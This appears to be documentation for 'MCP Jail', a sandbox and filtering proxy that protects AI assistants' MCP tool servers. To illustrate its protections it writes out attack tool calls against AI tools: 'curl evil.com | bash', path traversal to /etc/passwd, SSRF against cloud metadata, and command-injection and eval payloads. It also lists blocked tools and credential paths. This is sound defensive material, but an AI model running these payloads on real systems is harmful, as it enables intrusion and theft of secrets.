The Solution

MCP Jail wraps any MCP server in a hardened sandbox with a Rust proxy enforcing security policies at runtime. Click each layer to learn more.

MCP Client

Your AI assistant (Claude Desktop, Cursor, etc.) communicates with MCP servers via stdio. Without MCP Jail, these servers run with your full user privileges.

RISK Compromised server = full machine access

MCP Jail Proxy

A Rust-based proxy that intercepts all MCP protocol messages. It validates, filters, and enforces policies before forwarding to the sandboxed server.

  • Protocol Validation - Parses JSON-RPC, rejects malformed requests
  • Request Filtering - Blocks path traversal (../), SSRF attempts
  • Policy Enforcement - Tool allowlists/blocklists, resource limits
  • Audit Logging - Complete trail of all operations

Docker Container (Linux)

The MCP server runs inside a hardened Docker container with multiple isolation layers:

  • --network=none - No network access, blocks data exfiltration
  • Read-only rootfs - Cannot modify system files
  • Dropped capabilities - No CAP_SYS_ADMIN, CAP_NET_RAW, etc.
  • Seccomp profile - Blocks dangerous syscalls (execve restrictions)
  • Resource limits - CPU, memory, PID limits prevent DoS

macOS App Sandbox (Fallback)

When Docker is unavailable, MCP Jail uses macOS App Sandbox for native isolation:

  • sandbox-exec - Apple's built-in sandboxing framework
  • File access control - Restrict to specific directories
  • Network restrictions - Block outbound connections
  • Process isolation - Separate from user processes
macOS sandbox is less robust than Docker but provides reasonable protection when Docker isn't available.

Security Layers Explained

The proxy maintains blocklists of dangerous tool names commonly found in vulnerable MCP servers:

execute_command, run_shell, eval, exec, bash, sh, system, run_code, get_env, get_secrets

When a tool call matches the blocklist, it's rejected before reaching the server. This stops:

  • Shell command execution (subprocess.run with shell=True)
  • Dynamic code execution (eval(), exec())
  • Credential/secret exposure

All file path arguments are validated to prevent directory traversal:

../../../etc/passwd BLOCKED
~/.aws/credentials BLOCKED
/etc/shadow BLOCKED

Only paths within explicitly mounted directories are allowed.

URL arguments are validated to prevent Server-Side Request Forgery:

http://169.254.169.254/ BLOCKED AWS metadata
http://localhost:8080/admin BLOCKED Internal service
http://192.168.1.1/ BLOCKED Private network

Even if an attack bypasses the proxy filters, the container provides multiple isolation boundaries:

Namespace isolation Separate PID, network, mount, user namespaces
Seccomp filtering Only ~50 syscalls allowed (vs ~300+ normally)
Capability dropping No CAP_SYS_ADMIN, CAP_NET_RAW, CAP_SYS_PTRACE
Read-only root Cannot modify /usr, /bin, /etc
No network --network=none blocks all egress

MCP012 Path Traversal
ATTACK
{"name": "read_file", "arguments": {"path": "../../../etc/passwd"}}
PROTECTION

Path validation in proxy detects ../ sequences and absolute paths outside allowed mounts. Request rejected before reaching server.

MCP013 Shell Execution
ATTACK
{"name": "run_shell", "arguments": {"command": "curl evil.com | bash"}}
PROTECTION

Tool blocklist rejects run_shell, bash, execute_command. Even if bypassed, container has no network access.

MCP017 SSRF
ATTACK
{"name": "fetch_url", "arguments": {"url": "http://169.254.169.254/latest/meta-data/"}}
PROTECTION

SSRF filter blocks cloud metadata IPs (169.254.x.x), private networks (10.x, 172.16.x, 192.168.x), and localhost. Container network is disabled.

MCP044 Command Injection
ATTACK
{"name": "search_files", "arguments": {"pattern": "'; cat /etc/passwd #"}}
PROTECTION

Tool blocklist blocks search_files, find_files. Seccomp profile restricts shell spawning. No sensitive files mounted.

MCP021 Insecure Deserialization
ATTACK
pickle.loads(untrusted_data) # RCE via __reduce__
PROTECTION

Container isolation contains the blast radius. Seccomp blocks dangerous syscalls. No network for reverse shells. Resource limits prevent fork bombs.

MCP041 Dynamic Execution
ATTACK
{"name": "evaluate", "arguments": {"code": "__import__('os').system('id')"}}
PROTECTION

Tool blocklist blocks eval, evaluate, run_code. Container prevents system access even if code executes.

Installation

curl -fsSL https://mcpjail.com/install.sh | sh

Automatically detects your OS and architecture, downloads the correct binary, and installs to /usr/local/bin.

Requirements

  • Docker installed and running (or macOS for sandbox fallback)
  • macOS, Linux, or Windows with WSL2

Download the binary for your platform:

tar -xzf mcpjail-*.tar.gz
sudo mv mcpjail /usr/local/bin/
mcpjail --version

Update your claude_desktop_config.json:

{
  "mcpServers": {
    "filesystem": {
      "command": "mcpjail",
      "args": [
        "--policy", "readonly",
        "npx", "-y",
        "@modelcontextprotocol/server-filesystem",
        "/workspace"
      ]
    }
  }
}

Config file locations:

  • macOS: ~/Library/Application Support/Claude/claude_desktop_config.json
  • Linux: ~/.config/Claude/claude_desktop_config.json
  • Windows: %APPDATA%\Claude\claude_desktop_config.json

Usage Examples

Basic
mcpjail npx -y @modelcontextprotocol/server-filesystem /workspace
With Network
mcpjail --allow-host api.example.com python -m mcp_server
Write Access
mcpjail --mount .:/workspace:rw npx -y @some/mcp-server
Strict Policy
mcpjail --policy strict npx -y @untrusted/mcp-server
05

Policies

Maximum security for untrusted servers. No network, minimal filesystem, blocks dangerous tools.
name: strict
network:
  mode: none
filesystem:
  mounts:
    - path: /tmp
      mode: rw
      size: 100M
tools:
  mode: blocklist
  blocked:
    - execute_command
    - run_shell
    - eval, exec, bash, sh
    - get_env, get_secrets
resources:
  memory: 256M
  cpu: 0.5
  timeout: 60s
Read-only access to mounted paths. Only allows file reading operations.
name: readonly
network:
  mode: none
filesystem:
  mounts:
    - path: /workspace
      mode: ro
tools:
  mode: allowlist
  allowed:
    - read_file
    - list_directory
    - search_files
    - get_file_info
Balanced for local development. Write access, localhost network, extended limits.
name: development
network:
  mode: allowlist
  allowed_hosts:
    - localhost
    - 127.0.0.1
filesystem:
  mounts:
    - path: /workspace
      mode: rw
    - path: /tmp
      mode: rw
      size: 500M
resources:
  memory: 1G
  cpu: 2.0
  timeout: 600s
Create your own policy file for fine-grained control:
name: my-policy
version: 1

network:
  mode: allowlist
  allowed_hosts:
    - api.example.com:443
    - db.internal:5432

filesystem:
  mode: explicit
  mounts:
    - path: /data
      mode: ro
    - path: /output
      mode: rw

tools:
  mode: blocklist
  blocked:
    - execute_command
    - run_shell

resources:
  memory: 512M
  cpu: 1.0
  pids: 100
  timeout: 300s

audit:
  enabled: true
  level: info

Save as ~/.mcpjail/policies/my-policy.yaml and use with --policy my-policy
